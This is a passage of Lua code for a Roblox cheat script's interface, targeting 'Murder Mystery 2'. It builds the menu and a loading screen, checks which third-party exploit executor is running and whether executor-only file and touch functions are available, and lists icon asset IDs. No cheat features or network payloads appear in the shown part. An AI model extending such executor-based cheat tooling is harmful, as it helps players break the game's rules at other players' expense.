UI["9"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
UI["9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["9"]["BackgroundTransparency"] = 1;
UI["9"]["Size"] = UDim2.new(-0.12329, 0, 0.65126, 0);
UI["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["9"]["Text"] = [[Murder Mystery 2]];
UI["9"]["LayoutOrder"] = -2;
UI["9"]["AutomaticSize"] = Enum.AutomaticSize.X;
UI["9"]["Name"] = [[PlaceName]];
UI["9"]["Position"] = UDim2.new(0.00176, 0, 0.34874, 0);


-- StarterGui.Necroxis.Main.Line.Title.PlaceName.UITextSizeConstraint
UI["a"] = Instance.new("UITextSizeConstraint", UI["9"]);
UI["a"]["MaxTextSize"] = 25;


-- StarterGui.Necroxis.Main.Line.Title.UIListLayout
UI["b"] = Instance.new("UIListLayout", UI["6"]);
UI["b"]["Padding"] = UDim.new(0.01, 0);
UI["b"]["VerticalAlignment"] = Enum.VerticalAlignment.Bottom;
UI["b"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
UI["b"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Necroxis.Main.MainTabs
UI["c"] = Instance.new("Frame", UI["2"]);
UI["c"]["ZIndex"] = 10;
UI["c"]["BorderSizePixel"] = 0;
UI["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["c"]["Size"] = UDim2.new(0.23985, 0, 0.79874, 0);
UI["c"]["Position"] = UDim2.new(0.02545, 0, 0.15244, 0);
UI["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["c"]["Name"] = [[MainTabs]];


-- StarterGui.Necroxis.Main.MainTabs.UIGradient
UI["d"] = Instance.new("UIGradient", UI["c"]);
UI["d"]["Rotation"] = -60;
UI["d"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(32, 32, 32)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(31, 31, 31))};


-- StarterGui.Necroxis.Main.MainTabs.UICorner
UI["e"] = Instance.new("UICorner", UI["c"]);
UI["e"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.Necroxis.Main.MainTabs.Tabs
UI["f"] = Instance.new("ScrollingFrame", UI["c"]);
UI["f"]["Active"] = true;
UI["f"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
UI["f"]["BorderSizePixel"] = 0;
UI["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["f"]["Name"] = [[Tabs]];
UI["f"]["VerticalScrollBarPosition"] = Enum.VerticalScrollBarPosition.Left;
UI["f"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
UI["f"]["Size"] = UDim2.new(0.997, 0, 0.997, 0);
UI["f"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
UI["f"]["Position"] = UDim2.new(-0.00343, 0, 0.00017, 0);
UI["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["f"]["ScrollBarThickness"] = 0;
UI["f"]["BackgroundTransparency"] = 1;


-- StarterGui.Necroxis.Main.MainTabs.Tabs.UIPadding
UI["10"] = Instance.new("UIPadding", UI["f"]);
UI["10"]["PaddingTop"] = UDim.new(0, 10);
UI["10"]["PaddingRight"] = UDim.new(0, 8);
UI["10"]["PaddingLeft"] = UDim.new(0, 8);
UI["10"]["PaddingBottom"] = UDim.new(0, 10);


-- StarterGui.Necroxis.Main.MainTabs.Tabs.UIGridLayout
UI["11"] = Instance.new("UIGridLayout", UI["f"]);
UI["11"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
UI["11"]["CellSize"] = UDim2.new(1, 0, 0.13, 0);
UI["11"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Necroxis.Main.UIAspectRatioConstraint
UI["12"] = Instance.new("UIAspectRatioConstraint", UI["2"]);
UI["12"]["AspectRatio"] = 1.7937;


-- StarterGui.Necroxis.Loading
UI["13"] = Instance.new("CanvasGroup", UI["1"]);
UI["13"]["Visible"] = true;
UI["13"]["GroupTransparency"] = 1;
UI["13"]["ZIndex"] = 9999999;
UI["13"]["BorderSizePixel"] = 0;
UI["13"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["13"]["Selectable"] = true;
UI["13"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
UI["13"]["Size"] = UDim2.new(0.37634, 0, 0.58984, 0);
UI["13"]["Position"] = UDim2.new(0.49953, 0, 0.49898, 0);
UI["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["13"]["Name"] = [[Loading]];


-- StarterGui.Necroxis.Loading.UICorner
UI["14"] = Instance.new("UICorner", UI["13"]);
UI["14"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Necroxis.Loading.UIGradient
UI["15"] = Instance.new("UIGradient", UI["13"]);
UI["15"]["Enabled"] = false;
UI["15"]["Rotation"] = -50;
UI["15"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(3, 3, 3)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(31, 31, 31))};


-- StarterGui.Necroxis.Loading.Line
UI["16"] = Instance.new("Frame", UI["13"]);
UI["16"]["Visible"] = false;
UI["16"]["BorderSizePixel"] = 0;
UI["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["16"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
UI["16"]["Size"] = UDim2.new(0.9, 0, 0.00339, 0);
UI["16"]["Position"] = UDim2.new(0.5, 0, 0.80532, 0);
UI["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["16"]["Name"] = [[Line]];


-- StarterGui.Necroxis.Loading.Title
UI["17"] = Instance.new("Frame", UI["13"]);
UI["17"]["ZIndex"] = 2;
UI["17"]["BorderSizePixel"] = 0;
UI["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["17"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
UI["17"]["Size"] = UDim2.new(0.95014, 0, 0.16842, 0);
UI["17"]["Position"] = UDim2.new(0.5, 0, 0.88966, 0);
UI["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["17"]["Name"] = [[Title]];
UI["17"]["BackgroundTransparency"] = 1;


-- StarterGui.Necroxis.Loading.Title.Version
UI["18"] = Instance.new("TextLabel", UI["17"]);
UI["18"]["TextWrapped"] = true;
UI["18"]["ZIndex"] = 10;
UI["18"]["BorderSizePixel"] = 0;
UI["18"]["TextXAlignment"] = Enum.TextXAlignment.Left;
UI["18"]["TextScaled"] = true;
UI["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["18"]["TextSize"] = 14;
UI["18"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
UI["18"]["TextColor3"] = Color3.fromRGB(199, 199, 199);
UI["18"]["BackgroundTransparency"] = 1;
UI["18"]["Size"] = UDim2.new(0.0376, 0, 0.44614, 0);
UI["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["18"]["Text"] = [[1.0]];
UI["18"]["LayoutOrder"] = -1;
UI["18"]["Name"] = [[Version]];
UI["18"]["Position"] = UDim2.new(0, 0, 0.55386, 0);


-- StarterGui.Necroxis.Loading.Title.Version.UITextSizeConstraint
UI["19"] = Instance.new("UITextSizeConstraint", UI["18"]);
UI["19"]["MaxTextSize"] = 17;


-- StarterGui.Necroxis.Loading.Title.PlaceName
UI["1a"] = Instance.new("TextLabel", UI["17"]);
UI["1a"]["TextWrapped"] = true;
UI["1a"]["ZIndex"] = 10;
UI["1a"]["BorderSizePixel"] = 0;
UI["1a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
UI["1a"]["TextScaled"] = true;
UI["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["1a"]["TextSize"] = 14;
UI["1a"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
UI["1a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["1a"]["BackgroundTransparency"] = 1;
UI["1a"]["Size"] = UDim2.new(0.44735, 0, 0.65126, 0);
UI["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["1a"]["Text"] = [[Murder Mystery 2]];
UI["1a"]["LayoutOrder"] = -2;
UI["1a"]["AutomaticSize"] = Enum.AutomaticSize.X;
UI["1a"]["Name"] = [[PlaceName]];
UI["1a"]["Position"] = UDim2.new(0.03329, 0, 0.3682, 0);


-- StarterGui.Necroxis.Loading.Title.PlaceName.UITextSizeConstraint
UI["1b"] = Instance.new("UITextSizeConstraint", UI["1a"]);
UI["1b"]["MaxTextSize"] = 25;


-- StarterGui.Necroxis.Loading.Title.UIListLayout
UI["1c"] = Instance.new("UIListLayout", UI["17"]);
UI["1c"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
UI["1c"]["Padding"] = UDim.new(0.01, 0);
UI["1c"]["VerticalAlignment"] = Enum.VerticalAlignment.Bottom;
UI["1c"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Necroxis.Loading.Thumbnail
UI["1d"] = Instance.new("ImageLabel", UI["13"]);
UI["1d"]["BorderSizePixel"] = 0;
UI["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["1d"]["ScaleType"] = Enum.ScaleType.Fit;
UI["1d"]["Image"] = [[https://assetgame.roblox.com/Game/Tools/ThumbnailAsset.ashx?aid=142823291&fmt=png&wd=420&ht=42]];
UI["1d"]["Size"] = UDim2.new(1.00249, 0, 0.78291, 0);
UI["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["1d"]["BackgroundTransparency"] = 1;
UI["1d"]["Name"] = [[Thumbnail]];
UI["1d"]["Position"] = UDim2.new(-0.00249, 0, -0.00345, 0);


-- StarterGui.Necroxis.Loading.Thumbnail.UIGradient
UI["1e"] = Instance.new("UIGradient", UI["1d"]);
UI["1e"]["Rotation"] = 90;
UI["1e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(0.738, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Necroxis.Loading.Thumbnail.UIAspectRatioConstraint
UI["1f"] = Instance.new("UIAspectRatioConstraint", UI["1d"]);
UI["1f"]["AspectRatio"] = 1.77511;


-- StarterGui.Necroxis.Loading.BarGroup
UI["20"] = Instance.new("CanvasGroup", UI["13"]);
UI["20"]["BorderSizePixel"] = 0;
UI["20"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
UI["20"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
UI["20"]["Size"] = UDim2.new(0.92467, 0, 0.08959, 0);
UI["20"]["Position"] = UDim2.new(0.5, 0, 0.73398, 0);
UI["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["20"]["Name"] = [[BarGroup]];
	UI["ADDED"] = Instance.new("TextLabel", UI["13"]);
	UI["ADDED"]["BorderSizePixel"] = 0;
	UI["ADDED"]["BackgroundTransparency"] = 1
	UI["ADDED"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
	UI["ADDED"].TextColor3 = Color3.fromRGB(255, 255, 255)
	UI["ADDED"]["Size"] = UDim2.new(UI["20"].Size.X.Scale,UI["20"].Size.X.Offset,0.07,UI["20"].Size.Y.Offset)
	UI.ADDED.TextScaled = true
	UI.ADDED.Text = "Loading..."
	UI["ADDED"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
	UI["ADDED"]["Position"] = UI["20"].Position
	UI["ADDED"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
	UI["ADDED"]["Name"] = [[Status]];


-- StarterGui.Necroxis.Loading.BarGroup.UICorner
UI["21"] = Instance.new("UICorner", UI["20"]);



-- StarterGui.Necroxis.Loading.BarGroup.UIListLayout
UI["22"] = Instance.new("UIListLayout", UI["20"]);
UI["22"]["Padding"] = UDim.new(0, -15);
UI["22"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
UI["22"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
UI["22"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Necroxis.Loading.BarGroup.UIPadding
UI["23"] = Instance.new("UIPadding", UI["20"]);
UI["23"]["PaddingRight"] = UDim.new(0, 8);
UI["23"]["PaddingLeft"] = UDim.new(0, 8);


-- StarterGui.Necroxis.Loading.BarGroup.Bar
UI["24"] = Instance.new("Frame", UI["20"]);
UI["24"]["BorderSizePixel"] = 0;
UI["24"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 0);
UI["24"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
UI["24"]["Size"] = UDim2.new(0, 0, 0.5, 0);
UI["24"]["Position"] = UDim2.new(0.83044, 0, 0.5, 0);
UI["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["24"]["Name"] = [[Bar]];

-- StarterGui.Necroxis.Loading.BarGroup.Bar.UICorner
UI["25"] = Instance.new("UICorner", UI["24"]);
UI["25"]["CornerRadius"] = UDim.new(0, 3);


-- StarterGui.Necroxis.Loading.ImageLabel
UI["26"] = Instance.new("ImageLabel", UI["13"]);
UI["26"]["BorderSizePixel"] = 0;
UI["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["26"]["ScaleType"] = Enum.ScaleType.Fit;
UI["26"]["Image"] = [[rbxassetid://87605413959554]];
UI["26"]["Size"] = UDim2.new(0.087, 0, 0.12061, 0);
UI["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
UI["26"]["BackgroundTransparency"] = 1;
UI["26"]["Position"] = UDim2.new(0.89236, 0, 0.03101, 0);


-- StarterGui.Necroxis.Loading.ImageLabel.UICorner
UI["27"] = Instance.new("UICorner", UI["26"]);



-- StarterGui.Necroxis.Loading.ImageLabel.UIAspectRatioConstraint
UI["28"] = Instance.new("UIAspectRatioConstraint", UI["26"]);



-- StarterGui.Necroxis.Loading.UIAspectRatioConstraint
UI["29"] = Instance.new("UIAspectRatioConstraint", UI["13"]);
UI["29"]["AspectRatio"] = 1.3863;
--<< FUNCTIONS >>--
task.defer(function()
local function CloseUI()
	local tw = game.TweenService:Create(UI["1"].Loading, TweenInfo.new(1), {GroupTransparency = 1})
	tw:Play()
	tw.Completed:Wait()
	UI["1"]:Destroy()
	
	coroutine.yield()
end
--<< LOADING >>--
	UI["1"].Loading.BarGroup.Bar:GetPropertyChangedSignal("Size"):Connect(function()
		if UI["1"].Loading.BarGroup.Bar.Size.X.Scale <= 0.25 then
			
			game.TweenService:Create(UI["1"].Loading.BarGroup.Bar, TweenInfo.new(.5), {BackgroundColor3 = Color3.fromRGB(255,0, 0)}):Play()
		elseif UI["1"].Loading.BarGroup.Bar.Size.X.Scale <= 0.5 then
			--UI["1"].Loading.BarGroup.Bar.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
			game.TweenService:Create(UI["1"].Loading.BarGroup.Bar, TweenInfo.new(.5), {BackgroundColor3 = Color3.fromRGB(255, 150, 0)}):Play()
			elseif UI["1"].Loading.BarGroup.Bar.Size.X.Scale >= 0.75 then
	--UI["1"].Loading.BarGroup.Bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		game.TweenService:Create(UI["1"].Loading.BarGroup.Bar, TweenInfo.new(.5), {BackgroundColor3 = Color3.fromRGB(0, 255, 0)}):Play()
		end
	end)
	local ExecutorName = ({pcall(identifyexecutor)})[2]
	local Executor = ExecutorName:find("Codex" or "Vega" or "Wave" or "Argon" or "Swift" or "Arceus" or "Fluxus" or "Cubix")-- == "Codex" and "Vega" and "Wave" and "Argon" and "Swift"
	----if Executor then
	print(ExecutorName,Executor)
		game.TweenService:Create(UI["1"].Loading, TweenInfo.new(.5), {GroupTransparency = 0}):Play()
		task.wait(0.5)
	UI["1"].Loading.Status.Text = "Checking Executor"
	if not Executor  then
		Notif.New(ExecutorName.." Is Not Supported! Checking Functions...")
		
	end
	game.TweenService:Create(UI["1"].Loading.BarGroup.Bar, TweenInfo.new(0.5), {Size = UDim2.new(0.25,0,0.5,0)}):Play()
		task.wait(0.5)
	UI["1"].Loading.Status.Text = "Checking Needed Functions"
		if not readfile then
		Notif.New(string.format("<<? FAILED TO LOAD SCRIPT ?>>\n"..ExecutorName.." Is Missing readfile"))
			CloseUI()
		elseif not writefile then
		Notif.New(string.format("<<? FAILED TO LOAD SCRIPT ?>>\n"..ExecutorName.." Is Missing writefile"))
		CloseUI()
	elseif not isfolder then
		Notif.New(string.format("<<? FAILED TO LOAD SCRIPT ?>>\n"..ExecutorName.." Is Missing isfolder"))
		CloseUI()
	elseif not firetouchinterest then
		Notif.New(string.format("<<? FAILED TO LOAD SCRIPT ?>>\n"..ExecutorName.." Is Missing firetouchinterest!"))
		CloseUI()
		else
		game.TweenService:Create(UI["1"].Loading.BarGroup.Bar, TweenInfo.new(0.5), {Size = UDim2.new(0.5,0,0.5,0)}):Play()
		task.wait(0.5)
		UI["1"].Loading.Status.Text = "Waiting UI Loaded"
		end
		
task.wait(1)
	
	game.TweenService:Create(UI["1"].Loading.BarGroup.Bar, TweenInfo.new(0.5), {Size = UDim2.new(1,0,0.5,0)}):Play()
	local tw = game.TweenService:Create(UI["1"].Loading, TweenInfo.new(1), {GroupTransparency = 1})
	tw:Play()
	tw.Completed:Wait()
	UI["1"].Loading:Destroy()
	UI["1"].Main.Visible = true
--end
end)
end

local input = game:GetService("UserInputService")
local utility = {}
local objects = {}
do

	function utility:Tween(instance, properties, duration, ...)
		game.TweenService:Create(instance, TweenInfo.new(duration, ...), properties):Play()
	end

	function utility:Wait()
		game["Run Service"].RenderStepped:Wait()
		return true
	end

	function utility:Find(table, value) -- table.find doesn't work for dictionaries
		for i, v in  pairs(table) do
			if v == value then
				return i
			end
		end
	end

	function utility:Sort(pattern, values)
		local new = {}
		pattern = pattern:lower()

		if pattern == "" then
			return values
		end

		for i, value in pairs(values) do
			if tostring(value):lower():find(pattern) then
				new[#new + 1] = value
			end
		end

		return new
	end

	function utility:Pop(object, shrink)
		local clone = object:Clone()

		clone.AnchorPoint = Vector2.new(0.5, 0.5)
		clone.Size = clone.Size - UDim2.new(0, shrink, 0, shrink)
		clone.Position = UDim2.new(0.5, 0, 0.5, 0)

		clone.Parent = object
		clone:ClearAllChildren()

		object.ImageTransparency = 1
		utility:Tween(clone, {Size = object.Size}, 0.2)

		coroutine.wrap(function()
			wait(0.2)

			object.ImageTransparency = 0
			clone:Destroy()
		end)()

		return clone
	end

	function utility:InitializeKeybind()
		self.keybinds = {}
		self.ended = {}

		input.InputBegan:Connect(function(key, gameProcessedEvent)
			if self.keybinds[key.KeyCode] then
				for i, bind in pairs(self.keybinds[key.KeyCode]) do
					if (bind.gameProcessedEvent == gameProcessedEvent) then
						bind.callback()
					end
				end
			end
		end)

		input.InputEnded:Connect(function(key)
			if key.UserInputType == Enum.UserInputType.MouseButton1 then
				for i, callback in pairs(self.ended) do
					callback()
				end
			end
		end)
	end

	function utility:BindToKey(key, callback, gameProcessedEvent)

		self.keybinds[key] = self.keybinds[key] or {}

		table.insert(self.keybinds[key], {callback = callback, gameProcessedEvent = gameProcessedEvent or false})

		return {
			UnBind = function()
				for i, keybindData in pairs(self.keybinds[key]) do
					if keybindData.callback == callback then
						table.remove(self.keybinds[key], i)
					end
				end
			end
		}
	end

	function utility:KeyPressed() -- yield until next key is pressed
		local key = input.InputBegan:Wait()

		while key.UserInputType ~= Enum.UserInputType.Keyboard	 do
			key = input.InputBegan:Wait()
		end

		wait() -- overlapping connection

		return key
	end


	function utility:DraggingEnded(callback)
		self.ended[#self.ended + 1] = callback
	end

end
local icns = {
	assets = {
		["lucide-accessibility"] = "rbxassetid://10709751939",
		["lucide-activity"] = "rbxassetid://10709752035",
		["lucide-air-vent"] = "rbxassetid://10709752131",
		["lucide-airplay"] = "rbxassetid://10709752254",
		["lucide-alarm-check"] = "rbxassetid://10709752405",
		["lucide-alarm-clock"] = "rbxassetid://10709752630",
		["lucide-alarm-clock-off"] = "rbxassetid://10709752508",
		["lucide-alarm-minus"] = "rbxassetid://10709752732",
		["lucide-alarm-plus"] = "rbxassetid://10709752825",
		["lucide-album"] = "rbxassetid://10709752906",
		["lucide-alert-circle"] = "rbxassetid://10709752996",
		["lucide-alert-octagon"] = "rbxassetid://10709753064",
		["lucide-alert-triangle"] = "rbxassetid://10709753149",
		["lucide-align-center"] = "rbxassetid://10709753570",
		["lucide-align-center-horizontal"] = "rbxassetid://10709753272",
		["lucide-align-center-vertical"] = "rbxassetid://10709753421",
		["lucide-align-end-horizontal"] = "rbxassetid://10709753692",
		["lucide-align-end-vertical"] = "rbxassetid://10709753808",
		["lucide-align-horizontal-distribute-center"] = "rbxassetid://10747779791",
		["lucide-align-horizontal-distribute-end"] = "rbxassetid://10747784534",
		["lucide-align-horizontal-distribute-start"] = "rbxassetid://10709754118",
		["lucide-align-horizontal-justify-center"] = "rbxassetid://10709754204",
		["lucide-align-horizontal-justify-end"] = "rbxassetid://10709754317",
		["lucide-align-horizontal-justify-start"] = "rbxassetid://10709754436",
		["lucide-align-horizontal-space-around"] = "rbxassetid://10709754590",
		["lucide-align-horizontal-space-between"] = "rbxassetid://10709754749",
		["lucide-align-justify"] = "rbxassetid://10709759610",
		["lucide-align-left"] = "rbxassetid://10709759764",
		["lucide-align-right"] = "rbxassetid://10709759895",
		["lucide-align-start-horizontal"] = "rbxassetid://10709760051",
		["lucide-align-start-vertical"] = "rbxassetid://10709760244",
		["lucide-align-vertical-distribute-center"] = "rbxassetid://10709760351",
		["lucide-align-vertical-distribute-end"] = "rbxassetid://10709760434",
		["lucide-align-vertical-distribute-start"] = "rbxassetid://10709760612",
		["lucide-align-vertical-justify-center"] = "rbxassetid://10709760814",
		["lucide-align-vertical-justify-end"] = "rbxassetid://10709761003",
		["lucide-align-vertical-justify-start"] = "rbxassetid://10709761176",
		["lucide-align-vertical-space-around"] = "rbxassetid://10709761324",
		["lucide-align-vertical-space-between"] = "rbxassetid://10709761434",
		["lucide-anchor"] = "rbxassetid://10709761530",
		["lucide-angry"] = "rbxassetid://10709761629",
		["lucide-annoyed"] = "rbxassetid://10709761722",
		["lucide-aperture"] = "rbxassetid://10709761813",
		["lucide-apple"] = "rbxassetid://10709761889",
		["lucide-archive"] = "rbxassetid://10709762233",
		["lucide-archive-restore"] = "rbxassetid://10709762058",
		["lucide-armchair"] = "rbxassetid://10709762327",
		["lucide-arrow-big-down"] = "rbxassetid://10747796644",
		["lucide-arrow-big-left"] = "rbxassetid://10709762574",
		["lucide-arrow-big-right"] = "rbxassetid://10709762727",
		["lucide-arrow-big-up"] = "rbxassetid://10709762879",
		["lucide-arrow-down"] = "rbxassetid://10709767827",
		["lucide-arrow-down-circle"] = "rbxassetid://10709763034",
		["lucide-arrow-down-left"] = "rbxassetid://10709767656",
		["lucide-arrow-down-right"] = "rbxassetid://10709767750",
		["lucide-arrow-left"] = "rbxassetid://10709768114",
		["lucide-arrow-left-circle"] = "rbxassetid://10709767936",
		["lucide-arrow-left-right"] = "rbxassetid://10709768019",
		["lucide-arrow-right"] = "rbxassetid://10709768347",
		["lucide-arrow-right-circle"] = "rbxassetid://10709768226",
		["lucide-arrow-up"] = "rbxassetid://10709768939",
		["lucide-arrow-up-circle"] = "rbxassetid://10709768432",
		["lucide-arrow-up-down"] = "rbxassetid://10709768538",
		["lucide-arrow-up-left"] = "rbxassetid://10709768661",
		["lucide-arrow-up-right"] = "rbxassetid://10709768787",
		["lucide-asterisk"] = "rbxassetid://10709769095",
		["lucide-at-sign"] = "rbxassetid://10709769286",
		["lucide-award"] = "rbxassetid://10709769406",
		["lucide-axe"] = "rbxassetid://10709769508",
		["lucide-axis-3d"] = "rbxassetid://10709769598",
		["lucide-baby"] = "rbxassetid://10709769732",
		["lucide-backpack"] = "rbxassetid://10709769841",
		["lucide-baggage-claim"] = "rbxassetid://10709769935",
		["lucide-banana"] = "rbxassetid://10709770005",
		["lucide-banknote"] = "rbxassetid://10709770178",
		["lucide-bar-chart"] = "rbxassetid://10709773755",
		["lucide-bar-chart-2"] = "rbxassetid://10709770317",
		["lucide-bar-chart-3"] = "rbxassetid://10709770431",
		["lucide-bar-chart-4"] = "rbxassetid://10709770560",
		["lucide-bar-chart-horizontal"] = "rbxassetid://10709773669",
		["lucide-barcode"] = "rbxassetid://10747360675",
		["lucide-baseline"] = "rbxassetid://10709773863",
		["lucide-bath"] = "rbxassetid://10709773963",
		["lucide-battery"] = "rbxassetid://10709774640",
		["lucide-battery-charging"] = "rbxassetid://10709774068",
		["lucide-battery-full"] = "rbxassetid://10709774206",
		["lucide-battery-low"] = "rbxassetid://10709774370",
		["lucide-battery-medium"] = "rbxassetid://10709774513",
		["lucide-beaker"] = "rbxassetid://10709774756",
		["lucide-bed"] = "rbxassetid://10709775036",
		["lucide-bed-double"] = "rbxassetid://10709774864",
		["lucide-bed-single"] = "rbxassetid://10709774968",
		["lucide-beer"] = "rbxassetid://10709775167",
		["lucide-bell"] = "rbxassetid://10709775704",
		["lucide-bell-minus"] = "rbxassetid://10709775241",
		["lucide-bell-off"] = "rbxassetid://10709775320",
		["lucide-bell-plus"] = "rbxassetid://10709775448",
		["lucide-bell-ring"] = "rbxassetid://10709775560",
		["lucide-bike"] = "rbxassetid://10709775894",
		["lucide-binary"] = "rbxassetid://10709776050",
		["lucide-bitcoin"] = "rbxassetid://10709776126",
		["lucide-bluetooth"] = "rbxassetid://10709776655",
		["lucide-bluetooth-connected"] = "rbxassetid://10709776240",
		["lucide-bluetooth-off"] = "rbxassetid://10709776344",
		["lucide-bluetooth-searching"] = "rbxassetid://10709776501",
		["lucide-bold"] = "rbxassetid://10747813908",
		["lucide-bomb"] = "rbxassetid://10709781460",
		["lucide-bone"] = "rbxassetid://10709781605",
		["lucide-book"] = "rbxassetid://10709781824",
		["lucide-book-open"] = "rbxassetid://10709781717",
		["lucide-bookmark"] = "rbxassetid://10709782154",
		["lucide-bookmark-minus"] = "rbxassetid://10709781919",
		["lucide-bookmark-plus"] = "rbxassetid://10709782044",
		["lucide-bot"] = "rbxassetid://10709782230",
		["lucide-box"] = "rbxassetid://10709782497",
		["lucide-box-select"] = "rbxassetid://10709782342",
		["lucide-boxes"] = "rbxassetid://10709782582",
		["lucide-briefcase"] = "rbxassetid://10709782662",
		["lucide-brush"] = "rbxassetid://10709782758",
		["lucide-bug"] = "rbxassetid://10709782845",
		["lucide-building"] = "rbxassetid://10709783051",
		["lucide-building-2"] = "rbxassetid://10709782939",
		["lucide-bus"] = "rbxassetid://10709783137",
		["lucide-cake"] = "rbxassetid://10709783217",
		["lucide-calculator"] = "rbxassetid://10709783311",
		["lucide-calendar"] = "rbxassetid://10709789505",
		["lucide-calendar-check"] = "rbxassetid://10709783474",
		["lucide-calendar-check-2"] = "rbxassetid://10709783392",
		["lucide-calendar-clock"] = "rbxassetid://10709783577",
		["lucide-calendar-days"] = "rbxassetid://10709783673",
		["lucide-calendar-heart"] = "rbxassetid://10709783835",
		["lucide-calendar-minus"] = "rbxassetid://10709783959",
		["lucide-calendar-off"] = "rbxassetid://10709788784",
		["lucide-calendar-plus"] = "rbxassetid://10709788937",
		["lucide-calendar-range"] = "rbxassetid://10709789053",
		["lucide-calendar-search"] = "rbxassetid://10709789200",
		["lucide-calendar-x"] = "rbxassetid://10709789407",
		["lucide-calendar-x-2"] = "rbxassetid://10709789329",
		["lucide-camera"] = "rbxassetid://10709789686",
		["lucide-camera-off"] = "rbxassetid://10747822677",
		["lucide-car"] = "rbxassetid://10709789810",
		["lucide-carrot"] = "rbxassetid://10709789960",
		["lucide-cast"] = "rbxassetid://10709790097",
		["lucide-charge"] = "rbxassetid://10709790202",
		["lucide-check"] = "rbxassetid://10709790644",
		["lucide-check-circle"] = "rbxassetid://10709790387",
		["lucide-check-circle-2"] = "rbxassetid://10709790298",
		["lucide-check-square"] = "rbxassetid://10709790537",
		["lucide-chef-hat"] = "rbxassetid://10709790757",
		["lucide-cherry"] = "rbxassetid://10709790875",
		["lucide-chevron-down"] = "rbxassetid://10709790948",
		["lucide-chevron-first"] = "rbxassetid://10709791015",
		["lucide-chevron-last"] = "rbxassetid://10709791130",
		["lucide-chevron-left"] = "rbxassetid://10709791281",
		["lucide-chevron-right"] = "rbxassetid://10709791437",
		["lucide-chevron-up"] = "rbxassetid://10709791523",
		["lucide-chevrons-down"] = "rbxassetid://10709796864",
		["lucide-chevrons-down-up"] = "rbxassetid://10709791632",
		["lucide-chevrons-left"] = "rbxassetid://10709797151",
		["lucide-chevrons-left-right"] = "rbxassetid://10709797006",
		["lucide-chevrons-right"] = "rbxassetid://10709797382",
		["lucide-chevrons-right-left"] = "rbxassetid://10709797274",
		["lucide-chevrons-up"] = "rbxassetid://10709797622",
		["lucide-chevrons-up-down"] = "rbxassetid://10709797508",
		["lucide-chrome"] = "rbxassetid://10709797725",
		["lucide-circle"] = "rbxassetid://10709798174",
		["lucide-circle-dot"] = "rbxassetid://10709797837",
		["lucide-circle-ellipsis"] = "rbxassetid://10709797985",
		["lucide-circle-slashed"] = "rbxassetid://10709798100",
		["lucide-citrus"] = "rbxassetid://10709798276",
		["lucide-clapperboard"] = "rbxassetid://10709798350",
		["lucide-clipboard"] = "rbxassetid://10709799288",
		["lucide-clipboard-check"] = "rbxassetid://10709798443",
		["lucide-clipboard-copy"] = "rbxassetid://10709798574",
		["lucide-clipboard-edit"] = "rbxassetid://10709798682",
